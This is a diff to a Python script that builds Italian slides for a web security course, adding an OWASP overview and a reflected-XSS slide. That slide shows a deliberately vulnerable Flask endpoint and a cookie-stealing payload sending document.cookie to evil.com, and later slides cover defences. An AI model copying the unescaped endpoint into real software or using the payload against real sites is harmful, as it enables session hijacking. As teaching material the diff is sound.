@@ -810,7 +810,7 @@ except Exception as e:
 
 def make_l2():
     prs = new_pres()
-    total = 14
+    total = 15
     LL = "L2"
 
     slide_cover(prs, "2", "OWASP, threat modeling e STRIDE",
@@ -829,6 +829,21 @@ def make_l2():
                  "Bug a design: 1x. In coding: 5x. In testing: 10x. In produzione: 100x.",
                  "— IBM Cost of a Data Breach Report", 3, total)
 
+    slide_content(prs, LL, "OWASP — chi sono e cosa producono",
+                   [
+                       "Open Web Application Security Project",
+                       "Fondazione no-profit, internazionale, dal 2001",
+                       "Tutto gratuito · niente vendita di prodotti",
+                       "Standard de facto della sicurezza applicativa nel mondo",
+                       "",
+                       "Cosa pubblica (tutto open):",
+                       "  OWASP Top 10  ·  API Security Top 10  ·  LLM Top 10",
+                       "  Cheat Sheet Series  ·  ASVS  ·  SAMM",
+                       "  Tool: ZAP, Dependency-Check, Threat Dragon",
+                   ], 4, total,
+                   subtitle="Quando un collega dice 'A03', sta citando OWASP Top 10",
+                   emoji="🌐")
+
     slide_table(prs, LL, "OWASP Top 10 (2021/2025)",
                  ["#", "Vulnerabilità", "Esempio"],
                  [
@@ -842,7 +857,7 @@ def make_l2():
                      ["A08", "Software & Data Integrity", "Aggiornamenti non verificati"],
                      ["A09", "Logging Failures", "Non rilevi il breach per 200 giorni"],
                      ["A10", "SSRF", "App fetcha URL fornito dall'utente"],
-                 ], 4, total)
+                 ], 5, total)
 
     slide_table(prs, LL, "CVSS: bande di gravità (0-10)",
                  ["Range", "Severity", "Azione tipica"],
@@ -852,10 +867,10 @@ def make_l2():
                      ["4.0 – 6.9", "Medium", "Fix nel prossimo sprint"],
                      ["7.0 – 8.9", "High", "Patcha entro 30 giorni"],
                      ["9.0 – 10.0", "CRITICAL", "Patcha SUBITO (Log4Shell = 10.0)"],
-                 ], 5, total)
+                 ], 6, total)
 
     slide_section(prs, LL, "02", "Threat Modeling",
-                   "30 minuti di carta + lavagna salvano ore di refactor", 6, total)
+                   "30 minuti di carta + lavagna salvano ore di refactor", 7, total)
 
     slide_content(prs, LL, "Le 4 domande di Adam Shostack", [
         "1. Cosa stiamo costruendo? → disegna il sistema (DFD)",
@@ -864,7 +879,7 @@ def make_l2():
         "4. Abbiamo fatto un buon lavoro? → review e iterazione",
         "",
         "Si fa PRIMA di scrivere codice. Su carta, in 30-60 minuti.",
-    ], 7, total, emoji="❓")
+    ], 8, total, emoji="❓")
 
     slide_table(prs, LL, "STRIDE — sei lettere, sei categorie",
                  ["Lettera", "Categoria", "Esempio"],
@@ -875,10 +890,10 @@ def make_l2():
                      ["I", "Information Disclosure", "Esporre dati (stack trace, SQLi)"],
                      ["D", "Denial of Service", "Rendere indisponibile (DDoS)"],
                      ["E", "Elevation of Privilege", "IDOR, bypass authz"],
-                 ], 8, total)
+                 ], 9, total)
 
     slide_image(prs, LL, "DFD: esempio su mini-blog",
-                 f"{IMG}/cap2_dfd_mini_blog.png", 9, total,
+                 f"{IMG}/cap2_dfd_mini_blog.png", 10, total,
                  "Data Flow Diagram con trust boundary tra Internet/server e server/DB")
 
     slide_table(prs, LL, "STRIDE applicato al mini-blog",
@@ -891,7 +906,7 @@ def make_l2():
                      ["Webapp", "E", "SQLi → admin", "Query parametrizzate"],
                      ["DB", "I", "Backup esposto", "Cifratura backup"],
                      ["Flusso utente↔web", "I", "Sniffing Wi-Fi", "HTTPS"],
-                 ], 10, total)
+                 ], 11, total)
 
     slide_content(prs, LL, "Workshop in aula (30 min)", [
         "A coppie: applica STRIDE a un e-commerce piccolo",
@@ -901,7 +916,7 @@ def make_l2():
         "Disegno DFD (≥4 processi, 2 datastore, 2 trust boundary)",
         "Tabella STRIDE con ≥8 minacce sparse tra le 6 categorie",
         "Una mitigazione per ogni minaccia",
-    ], 11, total, emoji="✏")
+    ], 12, total, emoji="✏")
 
     slide_takeaway(prs, LL, [
         "OWASP Top 10: impara almeno i primi 5 a memoria",
@@ -909,12 +924,12 @@ def make_l2():
         "Threat modeling = 4 domande di Shostack",
         "STRIDE = checklist sistematica, 6 categorie",
         "Trust boundary = ogni attraversamento è opportunità d'attacco",
-    ], 12, total)
+    ], 13, total)
 
     slide_section(prs, LL, "03", "Per approfondire",
-                   "Cosa leggere prima della prossima lezione", 13, total)
+                   "Cosa leggere prima della prossima lezione", 14, total)
 
-    slide_qa(prs, LL, 14, total,
+    slide_qa(prs, LL, 15, total,
               next_lesson="L3 — SQL Injection (il cuore tecnico)")
 
     prs.save("L2_owasp_stride.pptx")
@@ -1185,7 +1200,7 @@ def make_l4():
 
 def make_l5():
     prs = new_pres()
-    total = 16
+    total = 17
     LL = "L5"
 
     slide_cover(prs, "5", "XSS e header HTTP di sicurezza",
@@ -1241,8 +1256,29 @@ def make_l5():
         "  Più raro, più subdolo",
     ], 6, total)
 
+    slide_code(prs, LL, "XSS Reflected — un attacco via link",
+                """# Endpoint Flask vulnerabile:
+@app.route("/cerca")
+def cerca():
+    q = request.args.get("q", "")
+    return f"<h1>Risultati per: {q}</h1>"
+
+# L'attaccante prepara un URL e lo manda alla vittima
+# (email phishing, chat, social, banner ads):
+https://example.com/cerca?q=<script>alert('XSS')</script>
+
+# La pagina restituita dal server:
+<h1>Risultati per: <script>alert('XSS')</script></h1>
+
+# Il browser ESEGUE lo script. Innocuo? Sostituisci con:
+<script>fetch('https://evil.com/log?c='+document.cookie)</script>
+
+# → Cookie di sessione della vittima inviato all'attaccante""",
+                7, total, lang_label="python", bad=True,
+                note="Reflected: il payload è nel link. Vittima: chi clicca.")
+
     slide_image(prs, LL, "Flusso di un attacco XSS Stored",
-                 f"{IMG}/cap5_xss_flow.png", 7, total,
+                 f"{IMG}/cap5_xss_flow.png", 8, total,
                  "Dal commento malevolo al furto del cookie di sessione")
 
     slide_code(prs, LL, "Difesa: escape automatico (Jinja2)",
@@ -1257,7 +1293,7 @@ def make_l5():
 # Java + Thymeleaf:  <span th:text="${query}"></span>
 # PHP + Twig:        {{ query }}
 # React:             {query}""",
-                8, total, lang_label="jinja", bad=False,
+                9, total, lang_label="jinja", bad=False,
                 note="Default escape è SEMPRE attivo. Non disabilitarlo con |safe.")
 
     slide_content(prs, LL, "Il pericolo del |safe", [
@@ -1271,7 +1307,7 @@ def make_l5():
         "",
         "Usali solo su testo statico che hai scritto TU.",
         "Mai, MAI, MAI su input utente.",
-    ], 9, total, emoji="⚠")
+    ], 10, total, emoji="⚠")
 
     slide_code(prs, LL, "Quando l'utente DEVE scrivere HTML ricco: bleach",
                 """# Scenario: commenti con grassetto/corsivo/link → escape NON va
@@ -1291,11 +1327,11 @@ safe_html = bleach.clean(user_html,
 
 # Input:  <p>Ciao <script>alert(1)</script><a href="javascript:..">x</a></p>
 # Output: <p>Ciao <a>x</a></p>     ← script rimosso, href javascript: rimosso""",
-                10, total, lang_label="python", bad=False,
+                11, total, lang_label="python", bad=False,
                 note="bleach mantiene tag voluti, butta tutto il resto. JS in DOMPurify.")
 
     slide_section(prs, LL, "02", "Header HTTP di sicurezza",
-                   "Configurazione rapida, difese potenti", 11, total)
+                   "Configurazione rapida, difese potenti", 12, total)
 
     slide_table(prs, LL, "I 6 header di sicurezza",
                  ["Header", "Cosa fa"],
@@ -1306,7 +1342,7 @@ safe_html = bleach.clean(user_html,
                      ["X-Content-Type-Options: nosniff", "Blocca MIME sniffing"],
                      ["Referrer-Policy", "Controlla cosa va nel Referer"],
                      ["Permissions-Policy", "Limita API browser (camera, mic)"],
-                 ], 12, total)
+                 ], 13, total)
 
     slide_code(prs, LL, "Cookie sicuri",
                 """# Configurazione Flask
@@ -1321,21 +1357,21 @@ app.config.update(
 # Set-Cookie: session=abc;
 #             Secure; HttpOnly; SameSite=Lax;
 #             Path=/; Max-Age=3600""",
-                13, total, lang_label="python", bad=False,
+                14, total, lang_label="python", bad=False,
                 note="3 attributi + 1 config = -90% rischio session hijacking")
 
     slide_takeaway(prs, LL, [
         "XSS = JavaScript dell'attaccante eseguito nel browser",
-        "3 tipi: Reflected, Stored (peggiore), DOM-based",
+        "3 tipi: Reflected (link), Stored (DB, peggiore), DOM-based",
         "Jinja2 fa escape di default — NON disabilitarlo",
         "Per HTML ricco voluto: bleach con whitelist",
         "Cookie sessione: Secure + HttpOnly + SameSite (sempre)",
-    ], 14, total)
+    ], 15, total)
 
     slide_section(prs, LL, "03", "Lab + sicurezza headers",
-                   "Test del proprio sito con securityheaders.com", 15, total)
+                   "Test del proprio sito con securityheaders.com", 16, total)
 
-    slide_qa(prs, LL, 16, total,
+    slide_qa(prs, LL, 17, total,
               next_lesson="L6 — Input validation + Supply chain")
 
     prs.save("L5_xss_header.pptx")
